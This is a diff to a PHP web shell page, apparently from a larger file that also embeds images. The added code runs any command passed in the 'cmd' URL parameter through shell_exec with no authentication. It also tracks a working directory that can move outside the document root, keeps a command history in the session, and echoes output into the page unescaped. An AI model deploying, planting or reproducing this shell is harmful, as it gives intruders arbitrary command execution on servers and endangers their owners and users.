@@ -1979,77 +1979,115 @@ RK5CYII=',
 
 
 <?php
-
-echo "<div class='shell' style='width: 95%; float:right; padding: 10px; margin: auto'>";
+ini_set('display_errors', 1);
+echo "<div class='shell'>";
 
 
 if( empty($_SESSION['history']) ) {
-            $_SESSION['history'] = "";
+        $_SESSION['history'] = "";
 }
 if( empty($_SESSION['last-cmd-output']) ) {
-            $_SESSION['last-cmd-output'] = "";
+        $_SESSION['last-cmd-output'] = "";
 }
 if( empty($_SESSION['last-cmd']) ) {
-            $_SESSION['last-cmd'] = "";
+        $_SESSION['last-cmd'] = "";
 }
+if( empty($_SESSION['shell_path']) ) {
+        $_SESSION['shell_path'] = rtrim($_SERVER['DOCUMENT_ROOT']);
+}
+$cwd_cmd = "cd " . rtrim($_SESSION['shell_path']) . ";";
 
 
-$script_name = basename($_SERVER['PHP_SELF']).PHP_EOL;
+$script_name = rtrim(basename($_SERVER['PHP_SELF']).PHP_EOL);
 $params           = array_merge( $_GET, array( 'reset' => '1' ) );
-$reset_history = $script_name . "?" . http_build_query( $params );
-#$reset_history = $script_name . "?reset=1";
+$reset_history = $script_name . "?" . trim(http_build_query( $params ));
+#$params           = array_merge( $_GET, array( 'reset_session' => '1' ) );
+#$reset_session = $script_name . "?" . http_build_query( $params );
 
-echo '<div class="cmd-form">';
-echo '<form action="' . $script_name . '" method="get">';
-echo 'Command:';
-echo '<input class="cmd-input" id="cmd" type="text" name="cmd"><br>';
-echo '<input type="hidden" name="p" value="' . htmlspecialchars($_GET['p']) . '">';
-echo "</br>";
-echo '<input value="Run" type="submit">';
-echo '</div>';
-echo "</br>";
-echo "<a href='" . $reset_history . "'>Reset History</a>";
-echo "</br>";
+$reset_session = $script_name . "?reset_session=1";
 
 
 if(isset($_GET["cmd"])){
     if($_GET['cmd'] != ""){
         $command = $_GET['cmd'];
-        $_SESSION['last-cmd'] = $command;
-        $cmd_output = shell_exec($command);
-        $_SESSION['last-cmd-output'] = $cmd_output;
-        echo '<div class="cmd-output floater">';
-        echo "<p class='section-header'>Command Output</p>";
-        echo "<div class='cmd'>".$command."</div>";
-        echo "<div class='print-output'>";
-        $output = '<div class="history-log"> <pre>' . $cmd_output . '</pre></div>';
-        echo $output;
-        echo "</div>";
-        $hist = $_SESSION['history'];
-        $new_hist = "<div class='cmd'>" . $command . "</div>" . $output . "</br>" . $hist . "</br></br>";
-        $_SESSION['history'] = $new_hist;
-        echo '</div>';
-    }
-} else {
-        echo '<div class="cmd-output floater">';
-        echo "<p class='section-header'>Command Output</p>";
-        echo "<div class='cmd'>". $_SESSION['last-cmd'] ."</div>";
-        echo "<div class='print-output'>";
-        $output = '<div class="history-log"> <pre>' . $_SESSION['last-cmd-output'] . '</pre></div>';
-        echo $output;
-        echo "</div>";
-        echo '</div>';
+        if (substr($command, 0, 3) == "cd "){
+           $new_dir = rtrim(substr($command, 3));
+           if (is_dir($_SESSION['shell_path'] . "/" . $new_dir) == true) {
+                if (strpos($new_dir, "..") !== false){
+                    echo "NEW DIR: " . $new_dir . "<br>";
+                    $new_dir_command = "cd " . $_SESSION['shell_path'] . "/" . $new_dir . ";pwd";
+                    echo "NEW DIR COMMAND: " . $new_dir_command . "<br>";
+                    $_SESSION['shell_path'] = rtrim(shell_exec($new_dir_command));
 
-}
+                } else {
+                    $new_dir_command = "cd " . $_SESSION['shell_path'] . "/" . $new_dir . ";pwd";
+                    $_SESSION['shell_path'] = rtrim(shell_exec($new_dir_command));
+                    }
+
+            }else {
+                echo "ERROR: " . $new_dir . " is not a directory<br>";
+            }    
+           
+        } else{
+            $cmd_output = shell_exec($cwd_cmd . $command);
+            $_SESSION['last-cmd-output'] = $cmd_output;
+            $_SESSION['last-cmd'] = $command;
+        }
+        
+    }
+} 
+
+echo "DOCUMENT_ROOT:<br>";
+echo rtrim($_SERVER['DOCUMENT_ROOT'])."<br>";
+echo "CURRENT PATH SETTING:<br>";
+echo $_SESSION['shell_path']."<br>";
+echo "RUN PREFACE:<br>";
+echo $cwd_cmd."<br>";
+
+
+echo '<div class="cmd-form">';
+echo '<form action="' . $script_name . '" method="get">';
+echo '<p class="section-header">Command:</p>';
+echo '<div class="terminal">';
+echo '<p class="shell-path">Working Dir: ' . $_SESSION['shell_path'] . '</p>';
+echo '<input class="cmd-input" id="cmd" type="text" name="cmd"><br>';
+echo '<input type="hidden" name="p" value="' . htmlspecialchars($_GET['p']) . '">';
+echo '<input class="submit" value="Run" type="submit">';
+echo '</div>';
+echo "<a class='reset' href='" . $reset_history . "'>Reset History</a>";
+echo "<a class='reset' href='" . $reset_session . "'>Reset Session</a>";
+echo '</div>';
+echo '<div class="section-output">';
+echo '<div class="cmd-output-section floater">';
+echo "<p class='section-header'>Command Output</p>";
+echo "<div class='last-cmd'>" . $_SESSION['last-cmd'] . "</div>";
+echo "<div class='last-cmd-output'>";
+$output = '<pre>' . $_SESSION['last-cmd-output'] . '</pre>';
+echo $output;
+echo "</div>";
+
+$hist = $_SESSION['history'];
+$new_hist = "<div class='history-cmd'>" . $command . "</div>" . "<div class='history-cmd-output'>" . $output . "</div>" . $hist;
+$_SESSION['history'] = $new_hist;
+echo '</div>';
 
 if(isset($_GET["reset"])){
     if($_GET['reset'] == "1"){
         $_SESSION['history'] = "";
     }
 }
-echo "<div class='history floater'>";
+if(isset($_GET["reset_session"])){
+    if($_GET['reset_session'] == "1"){
+        $_SESSION['last-cmd-output'] = "";
+        $_SESSION['last-cmd'] = "";
+        $_SESSION['shell_path'] = rtrim($_SERVER['DOCUMENT_ROOT']);
+        $_SESSION['history'] = "";
+
+    }
+}
+echo "<div class='history-section floater'>";
 echo "<p class='section-header'>History</p>";
-echo "<div class='print-output'>";
+echo "<div class='print-history'>";
 echo $_SESSION['history'];
 echo "</div>"; //history-form
 echo "</div>"; //history
@@ -2060,39 +2098,66 @@ echo 'var input = document.getElementById("cmd");';
 echo 'input.focus();';
 echo 'input.select();';
 echo '</script>';
+echo '</div>';
 
 ?>
 <style>
+.shell-path{
+    width: auto;
+}
+.print-history{
+    height: 15vw;
+    overflow-y: scroll;
+}
+.cmd-input{
+    background-color: black;
+    border: none;
+    color: white;
+    font-family: Courier;
+    height: 2vw;
+    font-size: medium;
+    padding: 6px;
+    min-width: 95%;
+}
+
 .floater{
     float: left;
     padding: 10px;
     margin: auto;
     width: 45%;
 }
-.print-output{
-    overflow-y: auto;
-    max-height: 20vw;
-    border-width: 2px;
-    border-color: black;
-}
-.cmd-input{
-    min-width: 95%;
+.reset{
+    padding-right: 3px;
+    color: red;
 }
 .cmd-form{
     width: 80%;
+    margin: auto;
 }
 .section-header{
     font-weight: bold;
-    padding-right: 10px;
 }
 .file-browser{
     overflow-y: scroll;
     max-height: 20vw;
 }
-div.cmd{
+.last-cmd-output{
     padding-bottom: 10px;
     padding-top: 4px;
     color: #0600ff;
     font-weight: bolder;
+    overflow-y: auto;
+    max-height: 15vw;
+    border-width: 2px;
+    border-color: black;
 }
+.history-cmd-output{
+    padding-top: 4px;
+}
+.shell{
+    width: 95%; 
+    padding: 10px; 
+    margin: auto;
+}
+
 </style>
